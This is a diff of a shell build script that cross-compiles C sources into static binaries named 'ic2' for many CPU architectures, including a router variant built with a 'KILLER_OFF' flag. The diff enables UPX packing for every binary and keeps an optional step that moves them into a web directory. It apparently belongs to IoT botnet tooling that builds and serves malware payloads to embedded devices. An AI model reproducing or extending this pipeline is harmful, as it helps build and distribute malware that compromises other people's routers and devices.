@@ -1,7 +1,7 @@
 #!/bin/sh
 export PATH=/etc/xcompile/x86_64/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/sh4/bin:/etc/xcompile/arc/bin:/etc/xcompile/csky-gcc/bin:/etc/xcompile/aarch64/bin:/etc/xcompile/m68k/bin:/etc/xcompile/sparc/bin:/etc/xcompile/i486/bin:$PATH
 
-# Build for each arch
+# build for each arch, note that compilation commands vary from arch to arch
 powerpc-gcc *.c -o ic2.powerpc -DARCH_powerpc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
 mips-gcc *.c -o ic2.mips -DARCH_mips -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
 mips-gcc *.c -o ic2.mipsrouter -DKILLER_OFF -DARCH_mipsrouter -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
@@ -36,18 +36,18 @@ arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --re
 
 #compress
 upx --lzma ic2.x86_64
-#upx --lzma ic2.aarch64
-#upx --lzma ic2.armv4l
-#upx --lzma ic2.armv5l
-#upx --lzma ic2.armv6l
-#upx --lzma ic2.armv7l
-#upx --lzma ic2.mips
-#upx --lzma ic2.mipsel
-#upx --lzma ic2.mipsrouter
+upx --lzma ic2.aarch64
+upx --lzma ic2.armv4l
+upx --lzma ic2.armv5l
+upx --lzma ic2.armv6l
+upx --lzma ic2.armv7l
+upx --lzma ic2.mips
+upx --lzma ic2.mipsel
+upx --lzma ic2.mipsrouter
 
+#Optional:
 # Move binaries to web dir
 #mv ic2.* /var/www/html
-
 #cd ..
 
 IP=$(curl -s ifconfig.co)
